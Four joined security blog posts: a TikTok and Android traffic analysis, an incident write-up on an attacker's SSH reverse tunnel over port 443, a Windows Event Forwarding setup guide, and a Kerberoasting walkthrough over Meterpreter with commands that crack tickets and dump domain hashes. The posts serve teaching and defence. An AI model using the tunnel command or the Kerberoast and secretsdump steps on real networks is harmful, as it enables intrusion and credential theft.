Title: Lets talk about Tick Tok
I recently heard something on the news that caught my attention.  I suppose that isn’t abnormal these days, but this in particular was the first time I had heard of anything like it.  The US Government was considering banning a popular application in use on mobile devices.  Not just on government devices, but for all Americans.

That app was TikTok.  Now, I am old enough where I only kind of know what TikTok is, something about sharing video clips over social media or something, apparently my kids like it… something something, get off my lawn…

The alleged reason given for banning such an app was that it was sending data on US citizens to the Chinese government.  The only thing close to this that I recall bubbling up to national news was a ban on Huawei devices for the same kind of fears.

Data privacy concerns and surveillance capitalism tactics are fascinating and complex topics that I think really deserve more attention.  I think that at this point in time, most infosec professionals would answer “Yes” to the question “Do your apps and devices spy on you?”  But to what extent?

The intention of this blog is not to answer that question, that would probably take an entire book, but rather to cover a few core skills on how one could get started on the journey of mobile device and Android application analysis and answer that question for themselves.  

We will be sticking to passive kinds of analysis.  For example, we will attempt to identify network traffic and API calls, but we will not be sending manipulated data to the API servers.  We can look at the application and data on the device but should be really careful manipulating the application as it may do something unintended upstream.  There is a time and place for that kind of testing, and generally involves authorization to test the application in some form (a pen test or bug bounty program for example).

As luck would have it, I own a rooted Google 6P which is a Huawei manufactured Android phone.  I use it as a lab phone running Android 6.0 and Kali NetHunter and I use it mostly for Android application tests. 

I thought it would be interesting to take a look at what the network traffic looks like from the device.  And then afterward install TikTok and see what the communication looks like from it.

Device Baseline Analysis
To start, I wanted to see what remote hosts the phone attempted to connect to prior to installing TikTok.  I configured a Raspberry Pi 4 device that was part of a dropbox project that I did with Beau Bullock and Ralph May as an access point so that I could perform a packet capture of the device traffic.  


To get the WiFi access point running, I used a slightly modified version of the instructions David Fletcher published on our blog in 2017.  Once the wireless access point was functional, I associated the phone to the network then shut it off.  I then started tcpdump listening to the br0 interface and writing the packet capture out to file.  Next, I booted up the phone and let it sit idle for an hour while the pcap ran.  Note that there was not a SIM card in the phone, so it would not have an alternative but to use the WiFi access point.  Note that there were no other devices associated with the access point.


There are many options to analyze pcaps.  Wireshark is by far the most popular, and I use it quite a bit.  I also like to use command-line tools a fair amount too as in my opinion, they are easier to generate data that can be further processed. One of the techniques I like to start with when analyzing any network traffic is long and short tail analysis.  In other words, I like to see which hosts were communicated to the most, and which ones the least. This can be valuable at scale to find outliers in the data.  Tshark (the command line equivalent of Wireshark), can be used to generate this type of analysis.  First, we can look to see what DNS lookups were performed the most and the least by the device.


In our case, there were only 51 unique hosts, but there were still some interesting results.  As expected, there were a lot of requests for Google hosts.  It was, after all, a Google device and Operating system.  It should be obvious to all tech folks in 2020 that Google constantly tracks your location and behavior, but that is a different topic for a different time.  For this goal, I wanted to find something unexpected.  So let’s run the same tshark command, but exclude “google” and “gstatic” as a term.  


That gets the list of hosts down to 23.  Looking at the output, I think we could safely remove ytimg.com (YouTube) and ntp.org from the suspicious list.  Note that when I say suspicious list at this point of an analysis, I mean it warrants more investigation, not that I think it is malicious.  Malicious needs to be proven in my opinion.

As someone who has used cloudfront.net for relaying malware communications in the past, the 48 lookups to d2to8y50b3n6dq.cloudfront.net stuck out to me as something I would want to investigate as an analyst, same with akamaized.net.  I don’t consider it a good idea to assume all Content Delivery Network (CDN) traffic to be benign.  Attackers want to hide in the noise and CDNs are a great place for that.

Using whois, the app-measurement.com domain appeared to be related to Google, so we can shelve that one for analysis purposes.  Also, I had Instagram on the phone, so we can ignore the related domains there too.  Though it is somewhat interesting that after a reboot, the device, without the Instagram app being opened, there are communication attempts to the related hosts (likely the APIs).


The xtrapath3.izatcloud.net domain appeared to be related to the Android operating system and the GPS configuration. So we’re on to these weird-looking DNS lookups:

qiqgyezmfcqf.example.org
oxxlgxxwtp.example.org
jmnqdgx.example.org
jmnqdgx
qiqgyezmfcqf
oxxlgxxwtp
They sure do look like they would be related to something malicious, right?  Well, turns out, Chrome does this for a pretty good reason.  Some ISPs will respond to unresolved DNS requests with a page they control.  Often, these contain Ads.  Often, ad servers spread malware, and at the very least, users probably don’t want to see the ads. Chrome will notice if these requests resolve the same A record and if so, block any corresponding ads.  This would be expected behavior on an Android phone.

The lightstep-collector.api.ua.com and identity.api.ua.com domains appeared to be related to Under Armor based on the whois information.  This can be explained since MapMyRun was installed on the device.

The insightapi.p3-group.com seemed harder to explain.  The whois information was protected by domain privacy.  Visiting the p3-group.com website, they appeared to be a tech consulting company, but the site was in WordPress, and while it looked “nice”, it’s really not hard to stand up fake content in a WordPress site.  Not that I am saying it’s not legitimate, only that I couldn’t reasonably explain the traffic at this point of the analysis and thought it needed further looking into.  We will put that in the suspicious bin.

The cdn.ampproject.com domain appeared to be related to Google and accelerating searches on mobile devices.  That left the two reverse DNS lookups to 89.62.225.13 and 160.62.225.13. One seemed to be related to a telecom in Germany and a pharmaceutical company hosted at a german ISP.  I’ve seen before where whois was not accurate, and an IP address was reassigned, but we will put that in the suspicious bin since it’s not easily explained.



So from all the DNS hosts, the list of hosts that need more investigation were:

D2to8y50b3n6dq.cloudfront.net
p3ins.akamized.net
89.62.225.13.in-addr.arpa
160.62.225.13.in-addr.arpa
For further investigation, we move to Wireshark and Burp Suite.  Opening the pcap up in Wireshark we can use filters to find the two lookups we are interested in.

dns.qry.name == 160.62.225.13.in-addr.arpa


It appeared that both PTR records pointed to server-13-225-62-89.ewr53.r.cloudfront.net.


There was no other traffic to the IP addresses or the server-13-225-62-89.ewr53.r.cloudfront.net and addresses.  I still think that the reverse lookups were strange, but without additional traffic, it’s difficult to say that malicious communication is happening.  The next step would be to attempt to find a reference to the IP addresses on the file system of the device to see what they may be associated with.  But we should run down the rest of the network traffic first.

Since we have the pcap open in Wireshark, let’s take a look at the protocol hierarchy and see if there are other protocols besides HTTP and TLS we should investigate.  This can be found under the Statistics menu.  It’s expected that the vast majority of the traffic from the phone will be HTTP and TLS, though I have seen in the past where other protocols were in use.  In this case, HTTP, TLS, and ICMP appeared to be the only protocols we would want to investigate.


Aside from pinging the local network gateway, all of the ICMP traffic appeared to be ICMP Destination Port unreachable so not likely any kind of ICMP tunnel or other covert communications over ICMP. 

At this point, we should start looking at HTTP/S traffic.  The best way to do this in my opinion would be to set up Burp Suite Professional as an intercepting proxy.  I suggest spending the money on the professional for any level of application testing as it is too valuable of a tool for the cost.  However, the community version should also be fine for just analyzing the requests and responses, which is mostly what we will be using it for.

Once Burp Suite has launched, you will want to configure the proxy to listen on a network that the mobile device is also on because the default is the localhost address where Burp is running.  Likely this is just the same WiFi network. This is found under the Options tab under the Proxy tab.


Configure a web browser (I recommend Firefox for web and application testing) on the system running Burp and configure it to use the proxy.  A handy tool for switching between the proxy settings and no proxy in Firefox is the FoxyProxy Standard extension.

Once the browser is configured, visit http://burp and click CA Certificate to download the CA cert.  Once downloaded, while you’re here, import the certificate into Firefox’s certificate store.  This is found under Preferences and Privacy and Security.  Click View Certificates, then Import and follow the prompts and select Use this certificate to identify websites.



Getting the mobile device proxied through Burp Suite can be a little bit trickier depending on the version of Android in use.  There is a reason that I use Android 6.0 for testing whenever possible.  Starting with Android 7.0, the OS no longer honors the user certificate store to identify websites.  So using Android 6.0 for testing purposes is usually a bit easier.

To install the Burp Suite Certificate for Android 6.0:

Configure browser to use Burp and visit http://burp
Download cacert.der, rename to cacert.crt
Adb push cacert.crt /mnt/sdcard/Download
On device – Settings>Security>Install from Storage, select cacert.crt
If you are using Android 7.0 and higher, you will need to install the certificate as a system-level cert.  The instructions here should help get you started.

From the phone, to set the proxy up, go to advanced options of the connected WiFi network, then select manual for proxy settings, then enter the IP address and port that was configured in Burp Suite.

Once my phone was communicating through Burp, I rebooted it to see if the same traffic from the pcap would show up in Burp.  The D2to8y50b3n6dq.cloudfront.net domain appeared to be used to download a certificate store.  There were two files downloaded, cdnconfig.zip and truststore.zip.


The contents of the zip files correspond to what the URL stated, that purpose was to download certificate store contents.  This seemed to explain the D2to8y50b3n6dq.cloudfront.net and p3ins.akamized.net traffic.  Though I am not entirely sure how this is being used on the device when it is downloaded, it did not appear to be malicious.  However, I did not verify each CA in the truststore file.  If this was a corporate device, that effort may be worthwhile.




At this point, I felt pretty comfortable that at least for the hour the packet capture was running, that there was no data being siphoned from the phone without my knowledge or some other kind of compromise or malware.  Does this mean that I am 100% sure that something doesn’t check in to a command and control server once a day or once a month?  Not at all, but I am fairly confident that the device isn’t actively compromised.

App Analysis
Now on to TikTok.  Before installing it from the Google Play Store, I used ADB to list the installed packages on the phone.  

adb shell ‘pm list packages –f’

I started doing this on app assessments, because sometimes the app isn’t named something obvious.  Then I installed TikTok from the Play Store and tried to find it with ADB.  Sure enough, it was not named anything related to TikTok.


I created two text lists and used Python to find the difference between them.  The name of the app was com.zhiliaoapp.musically. Note that after the fact, I realized I totally forgot about the command line utility diff.  I have had Python on the brain for the last few months, and when you have a hammer everything looks like a nail.



Next, I used ADB to locate the base APK and pull it from the device for static analysis using the following steps:

adb shell pm path com.zhiliaoapp.musically

adb pull /data/app/com.zhiliaoapp.musically-1/base.apk path/to/desired/destination

Once the APK file was copied off, I processed it in MobSF to get an overview of the app with automated static analysis.  I like starting mobile application assessments with MobSF because it automates some tasks that I would otherwise need to perform manually.


The application appeared to be relatively complex with 16 exported activities, 22 exported services, 22 exported receivers, and 4 providers.  An activity is a user interaction, sort of like an application on a Windows OS, where the user interacts with the application.  A service is a background task to perform some kind of operation.  Broadcast receivers send and receive messages to other Android apps or the Android OS.  Content providers manage data by the app and help share data with other apps.

All of these were essentially the attack surface area of the application and could be manipulated in some unintended way.  The best way to do that in my opinion is to use the Drozer framework.


It turned out that TikTok was a relatively large application, most of the Android apps I have analyzed in penetration tests have about a quarter of this size of attack surface area.  Analyzing these in detail will have to be a later blog post because of the number of them and that they may not help us answer our original question – what, if any, personal data is being sent from the application?

MobSF can provide some interesting information along these lines, as it extracts permission information from the Android manifest.  It can be difficult to ascertain if apps are overly permissive and if there are permissions granted that shouldn’t be necessary, but as with the size of exported intents, there were a lot of declared permissions.  There were 67 declared permissions.  In comparison to other apps I have analyzed, this was a relatively large amount.

There were a few permissions that seemed odd to me for an app that has a purpose of sharing short video clips online.  The android.permission.AUTHENTICATE_ACCOUNTS allows for the creation of accounts and setting passwords.  I would question why that would be necessary (and I have never seen that in other apps).  Then the 16 specific settings for modifying system data – I would also wonder why those would be necessary.  But again, it can be hard to determine from the outside looking in what functionality requires these.  If I had to make a yes or no decision on if the app was overly permissive, I would say yes.

Since the phone was set up to use Burp as a proxy and the Burp CA installed and trusted we can move on to network traffic inspection.  When the app was launched, the application traffic was intercepted.  I went through the initial “what am I interested in” choices and created an account and started watching a few videos and using the app for a few minutes.

Next, I saved all HTTP requests intercepted by Burp to a file and used command line tools to get an idea of how many hosts were involved in communication from the app.  Using command-line utilities, I counted 32 hosts that appeared to be related to TikTok network traffic.  For the most part, I found these through manual analysis of the Proxy traffic listed in Burp and used the domains as search terms with grep on the command line to get an easier parse text list.


There were many GET requests to TickTok APIs profiling my device, but this is not uncommon for developers to do.  Metrics for install base can be useful.  But, it could definitely be viewed as data collection.


I also noticed something odd in the sense that I have not seen this with other apps that I have analyzed (*Note that the vast majority of the apps I look at are for work engagements).  It appeared that most of the HTTP message bodies for API calls were encrypted.


Why do I say that the data being sent was encrypted?  I have seen where API requests were gzip compressed, but I have been able to look through the requests and find where the compressed file began and decode the traffic.  

To investigate this, I looked for the beginning of requests to hosts based on the time I launched the app and right-clicked on the message body and selected “Send to Decoder”.  This sends the request to the Burp Suite decoder which allows you to choose various types of decoding.  I was not able to locate a portion of data that was able to be decoded.


The requests in Burp can be saved to file by right-clicking in the proxy window and selecting Save Item.  The request will be base64 encoded and can be decoded at the command line by:

$echo “<paste base64 blob here” | base64 -d -w 0 > file_name

Next, take the HTTP header information out of the saved file, and you are left with the message body.  Using the file utility on the file results in “data” returned (no file magic bytes to discover).


I used the ent utility to check the entropy of a few of the larger message bodies and it appeared to be encrypted.


At this point, the best option to break the encryption would be to do some in-depth static analysis on the extracted APK and figure out how encryption is implemented and write some code to decrypt it.  That’s a bit beyond the scope of this post.

At this point in the analysis though, if I were performing a risk analysis for allowing the app on company devices, I think there would be enough data to decide against it.  But what about banning TikTok from the general public?  My opinion is that without breaking the encryption, it would be hard for me to say.  My guess is that it was decrypted by someone and that data was being collected was viewed as an invasion of privacy.

To play Devil’s Advocate though, what if we looked at other popular apps with huge install bases?  Apps like Instagram, Twitter, Snapchat, or Facebook?  They collect some amount of personal data.  We are in the Age of Surveillance Capitalism, selling human behavior for targeted advertising is how money is made for these companies.  What data are they sending?

Getting at the data sent by these other popular social media apps is even more difficult, as they are using a technique called Certificate Pinning to defeat traffic inspection.  This is where a specific certificate is embedded in the application to establish TLS encrypted communication, and if that certificate is not used (as in our case with using the Burp certificate) then communication is not established. 

To defeat Certificate Pinning, one would need to inject code into the application at runtime (using something like Frida) to remove or bypass the pinning code or decompile the app and edit smali files and repackage the app and install the modified app.  Neither option is a trivial exercise.  

Personally, I think it’s safe to assume as a user for any popular app, that personal data from your phone is being sent to any of these companies.  Does it matter where the company is headquartered?  Perhaps for some, perhaps not for most others.  At the end of the day, I think that the majority of people have no real idea how much their privacy is compromised by apps on their mobile devices, but that is a conversation for another day and another blog post.

Title: SSSH... Don't Tell them I am not HTTPS

Living Off the Land Binaries, Scripts, and Libraries, known as LOLBins or LOLBAS, are legitimate components of an operating system that threat actors can use to achieve their goals during a campaign against your organization. They do this to try to avoid detection from endpoint protection products and as an alternative to writing custom malicious code. 


Credit (original art): Locust Years
In many cases these binaries are well known, the techniques documented, and (hopefully) the malicious use is detectable by security products or threat hunting processes. However, in a recent incident response engagement, we found a LOLBAS technique that did not fall in that category of well documented. In fact, the technique does not currently appear to be in the MITRE ATT&K framework. 

The scenario was that the client had users report odd behavior on their laptops. There were fraudulent purchases made on personal accounts from their work system when they were not at work at the time.  When initially investigating, the client determined that there were Remote Desktop Protocol (RDP) connections from their domain controllers to the endpoints in question. Understandably, the client became very concerned and contacted BHIS for Incident Response assistance. 

We deployed Velociraptor in the environment and started analyzing network connections to the internet. We found that on a handful of Windows servers, there was a very suspicious Secure Shell (SSH) command connected to an external IP address. 

But wait! SSH on a Windows server? Isn’t that a Linux thing?   

We have found on both penetration tests and incident response engagement that many still do not realize the impact of the decision Microsoft made in 2018 to include OpenSSH in Windows Server and Desktop OSes. 

The old systems administrator in me likes the decision and thinks, “it’s about time I do not need a third party SSH client.” But the security analyst in me knows that SSH is an amazingly powerful and versatile tool. Threat actors know its power and versatility too. It is more capable than just logging in to a remote server and interactively running commands. 

Take the command we found during this incident investigation for example: 

ssh.exe sshtunnel@blackhillsinfosec.com -f -N -R 50000 -p 443 -o StrictHostKeyChecking=no 

In this SSH command, the attacker was establishing a SSH connection to the remote server at evil.com with a very specific intent in mind — a reverse tunnel into the victim network so that they can run their own commands against internal systems. This is accomplished with the flags used in this particular command: 

-f: The SSH command runs in the background. Used by the attacker to obfuscate their presence.   
-N: Do not execute a remote command. This is useful when just forwarding ports.
-R: Specifies that the given port on the remote host is to be forwarded to the local host and port on the victim network. This works by allocating a socket to listen to a port on the remote side and whenever a connection is made to this port, the connection is forwarded over the secure channel and a connection is made to victim machine.  This makes it a SOCKS proxy. 
-p: The port used to connect outbound from the internal network to the remote host, in this case, TCP 443, commonly associated with HTTPS, not SSH. 
-o: Options for which there is no specific command line switch, in this case StrictHostKeyChecking=no.
The StrictHostKeyChecking=no option is used so that when the command is run, the SSH client does not ask to verify the server host key… you know, that message we all just answer ‘yes’ to when connecting to an SSH server. But why would the attacker do this? 

They wanted to avoid that interactive prompt in a new SSH command from a new host because of persistence. There was a scheduled task that ran a batch file stored in C:\Windows\Temp that was similarly named to a valid Windows DLL. 

Some of you may be thinking, “What about the password prompt?” when SSH connects. Others may be thinking that the attackers solved that interactive password prompt by dropping an SSH private key on the system… That is what I thought too.   

However, there was not a private key to be found on any of the compromised hosts. This really made me curious; how could that be possible… could it really be no password to authenticate? That would not be a good choice for an attacker to make.  After some sciencing in the lab, it turns out that the answer is: sort of… 

OpenSSH server allows configuration for a tunnel only user, in that a specific user account can be set up to not receive a shell when authenticating. In the server-side configuration, the following option in the sshd_config file sets up a tunnel only user. 


Additionally, the SSH tunnel only user needs to have an empty password. This can be accomplished with the passwd command with the -d switch.   

The last configuration piece to allow the tunnel only user to connect is to add ‘ssh’ to the /etc/securetty file. This is necessary for allowing a user with an empty password to login over SSH. 

This configuration will not allow the tunnel only user (sshtunnel) to connect and establish a shell or run commands on the remote server, but only establish a connection that sets up the reverse proxy type configuration. 

What can an attacker do with this? In many ways, it’s analogous to plugging a computer physically into the network. Making the assumption that there are compromised domain credentials, which is likely to make it to the point of setting up SSH in this manner, you can do pretty much whatever you need to accomplish your nefarious objectives.   

For example, you can proxy RDP through SSH to connect to systems that the compromised credential has access to. One of the things I like to do on penetration tests with proxy access similar to this, is use proxychains and Python utilities like Impacket and Python Bloodhound to attempt to avoid host-based detection. 

How do you detect and prevent this from happening to your network? One of the most common things we see in Incident Response and Penetration Test clients is the lack of sufficient egress network traffic filtering from the local network to the internet.   

If you have an application layer firewall (most firewalls these days probably are), you can prevent a successful SSH connection on an off port by configuring it so that only the expected application traffic can use the associated port. For example, only HTTPS traffic can use TCP 443; SSH cannot.   

In addition, it would work to implement a deny rule for any TCP ports you do not use for business purposes. If there are ports that are limited use, like TCP 22 for SSH, and only a few systems administrators need to use it, limit the port to those individuals as an exception. 

There are some good detection opportunities here as well. The specific SSH flags in use here are not common for normal systems administration. Alerting on the use of those flags from the command line across your environment should generally be a high-fidelity alert. 

From a threat hunting perspective, you could take a look at all of the known_hosts files in the environment. When SSH connects to a host on a port that is not TCP 22, it will put brackets around the host name. In most environments, brackets in a known_hosts file should be considered suspicious.   


Please note: the screenshot above is an example known_hosts file and obviously does not contain the atomic indicators (IP address and host name) from the incident. Those are not shared publicly, but if you are a BHIS SOC customer, you already have detection and active threat hunting for this threat actor. 
I want to expand on our previous blog post on consolidated endpoint event logging and use Windows Event Forwarding and live off the Microsoft land for shipping events to a central location. Why do this?  

Title: Windows Event Forwarding

I wanted a Windows-based server with all of the event logs from the environment so that I could use PowerShell for analysis purposes. Because then I could potentially just send the forwarded events to an upstream ELK server and visualization and have multiple options to work with the data. This architecture then forms a part of the set-up needed for our CredDefense Toolkit.

Also, there are some environments where deploying yet another agent to Windows endpoints may not be desirable. WEF has been around for quite some time, but many people do not realize that log consolidation capability is built into Windows and does not use an agent on the endpoint.

There were a few really good guides that already exist (mentioned in the references links), but they did not get me completely over the hump to getting WEF completely functional. This is probably due to different releases Microsoft Server OSes. Windows Server 2012 was used on the server-side for all of the lab systems and there was a mix of Windows 10 Enterprise and Pro and Windows 7 Pro for workstations.

Windows Event Forwarder Setup

The first step is to stand up the collector server that will receive the logs from the rest of the windows systems in the environment.  The size of the system will be determined by your environment, but we will not be sending every event, so a modest server can be used and then sized up if requirements change.

First, run the following commands on the collector server:

C:>winrm qc
This starts the WinRM service, and sets the service startup type to auto-start as well as configures a listener for the ports that send and receive WS-Management protocol messages.

Next use wecutil to configure the Windows Event Collector service and that it also starts when the system is rebooted.

C:>wecutil qc

This will also result in a Service Principal Name being registered for Kerberos authentication.  If you are using an existing server and it has an HTTP SPN already registered WEF will not work unless you remove the existing one.  If you’re using a new system, you probably will not have to worry about it.  If during setup you are having issues and need to check SPN registration, you can do so with:

setspn -t <domain> -q */*
Create a Test Subscription on Collector server

Create a domain security group for the endpoints that you wish to monitor and place the target systems in the group. Alternatively, you could just use “Domain Computers” if you are in a testing environment.  Otherwise, using all computers in your environment to initially set up may not be the best idea. Better to start smaller and work outwards than stumble out of the gate.

Once you work out what the target systems are, on the collector server open Event Viewer and select the Subscriptions. You will likely be prompted to start an auto-configure the Windows Collector service. Select “Yes”.


Right-click on Subscriptions and select “Create Subscription”. For the Subscription Name enter “Security Log Cleared”. The Destination log should be “Forwarded Events”. Select the radio button for “Source computer initiated” and select “Select Computer Groups…”. Add the target group that you will initially monitor.

Next, select “Select Events…” and the Event log drop-down choose the Security log.




For the purposes of this guide, we will create one GPO that will contain all the settings for forwarding event logs for endpoint security analysis. Additionally, all domain member computers will be forwarding to the same WEF server.  

Open the Group Policy Management panel and select your domain right-click and select Create a GPO in this domain, and Link it here… Type in a name, such as Windows Event Forwarding and select OK.


Configure Event Log Forwarding Entry

Under Computer>Policies>Admin Templates>Windows Components>Event Forwarding Right click on the Configure target Subscription Manager entry and select Edit.  Select the Enabled radio button and “Show” next to Subscription Managers in the Options pane.


Enter the following line in for the value substituting the Fully Qualified Domain name for the “eventserver.domain.local” portion of the URL below:

Server=http://eventserver.domain.local:5985/wsman/SubscriptionManager/WEC,Refresh=60
Note that this configuration is forwarding over HTTP rather than HTTPS.  The forwarded event traffic can be encrypted and use HTTPS if desired.

Turn on Windows Remote Management (WS-Management) Service via GPO

The Windows Remote Management (WS-Management) service will need to be started on all the systems that will forward events.  Note that they do not need to be listening on HTTP or HTTPS – the only system that needs that needs to be listening and have firewall rules configured is the WEF server.

To enable the Windows Remote Management to start on boot, in the Group Policy Management Editor select Computer Configuration>Preferences>Control Panel Settings>Services. Then right-click in the services pane and select New>Service.

In the startup field, select Automatic (Delayed Start) and select the service name as WinRM – also listed as Windows Remote Management (WS-Management).  Leave the service action to “Start Service”.  Click Apply and OK.

Allow Local Network Service to Access Local Event Logs via GPO

The local system that will be forwarding the logs to the central WEF server will need to have the Network Service account granted access to read event logs.  There is a built-in Windows group that comes in handy for this called “Event Log Readers”.

Under Computer Configuration>Windows Settings>Security Settings>Restricted Groups, right-click and select Add Group… and type in Event Log Readers and select OK. Right-click on the Event Log Readers group that you just added and select properties and add NETWORK SERVICE.  Click Apply and OK.


Sysmon GPO

Microsoft’s Sysmon is a tool released as part of the Sysinternals Suite. It extends the endpoint’s logging capability beyond the standard event logs. Windows now can natively log the full command line of a process that executes, but Sysmon provides additional data that can be very useful.

Hash of executed process
Network Connections
File creation time changes
WMI filters and consumers
On the local system, it stores these logs in Event Viewer in Application and Services Logs>Microsoft>Windows>Sysmon>Operational. By default, Sysmon logging will create a fair amount of log noise. This is why a configuration file should be used at install time to filter events at the endpoint that are known to be good or alert on specifically known bad. This way, you’ll won’t be shipping more than necessary to the central collector.

We recommend that you start with the excellent @SwiftOnSecurity configuration file that can be found at their Github page. From there, you can add to the file what you need to further reduce noise in your environment.

One way to deal with Sysmon deployment is to create a startup script via GPO that runs a batch file to check to see if Sysmon is installed and if not install it with the correct configuration file. If it is installed, make sure the service is started.

A sample install script can be found here. Make sure that the  Sysmon executable, the configuration file, and the batch file are all in a common share. We chose the SYSVOL share – edit the script accordingly to your choice in your environment.

In the GPO Editor, choose Computer Configuration>Windows Settings>Scripts (Startup/Shutdown) and add in the install script.


PowerShell Script Block and Module Logging

Leveraging PowerShell for attacks has become very popular with both pentesters and actual threat actors.  In the past, PowerShell logging capabilities were lacking, but that changed with PowerShell 5.0. This is the default version of Windows 10, so if you have migrated all Windows Endpoints from Windows 7, you’re good to go.

At the time of this post, most places have yet to move away completely from Windows 7 though.  If this is true for your environment, you’ll need to install Windows Management Framework 5.0 and turn on logging via GPO. This task is left to the reader to figure out what best fits for their environment for software deployment.

After the install, use the GPO editor to turn on Module and Script Block logging. This is in Administrative Templates>Windows Components>Windows PowerShell.

Module logging will record pipeline execution details in Event ID 4103 and has details on scripts and formatted data from the output. Script Block Logging will record code as it is executed by the PowerShell Engine, therefore recording de-obfuscated code, to event ID 4104.


An additional caveat for Windows 7 systems is to download the Administrative Templates for Windows 10 and copy the PowerShellExecutionPlicy.admx and PowerShellExecutionPolicy.adml to the \\sysvol\Policies\Policy Definitions directory.

Additional Subscriptions

At this point, you should be ready to test out Event Forwarding. Before creating additional subscriptions, clear the event log of one of the subscribed endpoints. You can verify the status of the clients checking in by right-clicking the subscription and choosing Runtime Status. If everything is working appropriately, the cleared log event will soon show up in the Forwarded Events log on the WEF server.


If all is working correctly, it’s time for creating additional subscriptions that facilitate collecting what matters.  The NSA Spotting the Adversary publication can be used as a guide, below is what we suggest as a minimum.

Account and Group Activity

This subscription will collect domain and local group and account activity.  The Security Event Log events to add are: 4624,4625,4648,4728,4732,4634,4735,4740,4756.  These events will be necessary to perform authentication analysis.


Kerberos

This subscription if for event ID 4769 from Domain Controllers.  There will be a large amount of data recorded as ticket requests are frequent, however, paired with a HoneyToken account, it has the potential to detected Kerberoasting attacks.

Powershell Logging

To collect the module and script block events that were enabled earlier, create a subscription to gather the Microsoft-Windows-PowerShell/Operational log and get Event IDs 4103 and 4104.


Sysmon

All of the Sysmon log will be shipped to the WEF server.  Select the Microsoft-Windows-Sysmon/Operational Event log and leave the targeted computers to “All Computers”.


Shipping Logs to ELK

Similar to our previous posts on endpoint log consolidation we will use nxlog to ship the logs from the WEF server to an ELK stack.  This architecture allows for usage of PowerShell and C3 tools on the Windows-based log server and EVTX files as well as providing the visualization search capabilities with ELK.

Use the previous blog post to get ELK up and running if you need to.  The configuration file for nxlog will be different.  Install nxlog on the WEF server and modify the configuration file here to point to your ELK stack.

A basic logstash filter for ingesting the forwarded logs can be found here.

Conclusion

Windows Event Forwarder provides a native way to consolidate Windows Endpoint logs.  PowerShell and C# tools can be used on the WEF server for analysis of the forwarded events.  Additionally shipping the events to an ELK stack provides visualization and hunting capabilities. The overall design paired with sending specific log files such as authentication, PowerShell module, and script block logging and Sysmon logs creates a DIY SIEM set up that can be used to detect potential attackers in your network.

Title: A Toast to Kerberos

This post will walk through a technique to remotely run a Kerberoast attack over an established Meterpreter session to an Internet-based Ubuntu 16.04 C2 server and crack the ticket offline using Hashcat.

Recently I have had a lot of success with privilege escalation in an Active Directory domain environment using an attack called Kerberoasting.  Tim Medin presented this technique at SANS Hackfest 2014 and since then there have been numerous awesome articles and conference talks on the details of the attack and tools written for different techniques to pull it off (reference links at the bottom of the post).

The Microsoft implementation of Kerberos can be a bit complicated, but the gist of the attack is that it takes advantage of legacy Active Directory support for older Windows clients and the type of encryption used and the key material used to encrypt and sign Kerberos tickets. Essentially, when a domain account is configured to run a service in the environment, such as MS SQL, a Service Principal Name (SPN) is used in the domain to associate the service with a login account. When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service.

This is a bit of an oversimplification of the details of the process for sure, but the end result is that any valid domain user can request an SPN for a registered service (mostly I have seen SQL and IIS) and the Kerberos ticket received can be taken offline and cracked.  This is significant because generally a service account is at the very least going to be an administrator on the server where it runs.

So how do we pull this off?  Assuming that Metasploit is installed on the C2 server already, we need to get the Impacket project from Core Impact.  This is a collection of Python classes for working with network protocols.  If Metasploit is not installed, the PTF framework from TrustedSec makes it easy on Ubuntu 16.04.

#git clone https://github.com/CoreSecurity/impacket
Next, we need to install and configure proxychains.  After install, the only configuration change is the desired port (for example, 8080).

#apt-get install proxychains

Now we need an established meterpeter session.  There are many ways to go about this in a pen test and different methods can be situationally dependent so we will assume an established session is active.


Next, we set a route in Metasploit to cover the internal subnet that contains the IP address of a Domain Controller.


We now need a method to route externally to Metasploit tools through the meterpreter connection.  For this, Metasploit has a module named socks4a that uses the built-in routing to relay connections.  Set the SRVPORT option to the same port value used with configuring proxychains.


I am a generally a paranoid person, and since the socks proxy port is now an open socket that routes through to an internal network, I suggest using IP tables to limit connections to 8080 to the localhost.  Some proponents of hacking naked may think this is overkill, but sometimes I think wearing around a firewall is appropriate – this is one of those times.  The IP tables rules file I use is here.

Place the IP tables rules file in /etc/iptables.rules and run:

#/sbin/iptables-restore < /etc/iptables.rules

Now we are all set to use one of the Impacket example scripts and a valid and unprivileged domain account to gather Kerberos tickets advertised via SPN using proxychains over the meterpreter session.

#proxychains GetUserSPNs.py -request -dc-ip 192.168.2.160 lab.local/zuul

Any Kerberos tickets gathered by the GetUserSPNs script directly crackable with Hashcat without any additional conversion (the hash type was added in version 3.0).  On my Windows desktop with a single Radeon R280, the password for the service account was cracked in three minutes using the Crackstation word list.

hashcat -m 13100 -a 0 sqladmin_kerberos.txt crackstation.txt

To take it one step further, the same method of proxying tools over meterpreter can be used to dump out domain account hashes from the domain controller using another example Impacket script named secretsdump.py once domain administrator rights have been obtained.

In this example in my lab, I had the SQL admin service account with a weak password also a member of the Domain Admins group.  You may think this is a bit contrived, but it is not.  In the last few months, especially in older Active Directory environments that have grown organically over the years, I have directly obtained a domain administrator account using Kerberoasting and cracking a Domain Admins group member password.  I have subsequently elevated to domain administrator from further pivoting on numerous occasions.

#proxychains secretsdump.py -just-dc-ntlm LAB/sqladmin@192.168.2.160

The fix for this at the moment is to make sure that all service accounts in your environment have really long passwords.  How long depends on what resources you think your potential attacker has access to for cracking passwords. My current suggestion (based on potential password cracking tool limitations) is 28 characters or longer with a 6-month rotation.

Thank you to everyone who has put a lot of time, research, and effort into attacking Kerberos.
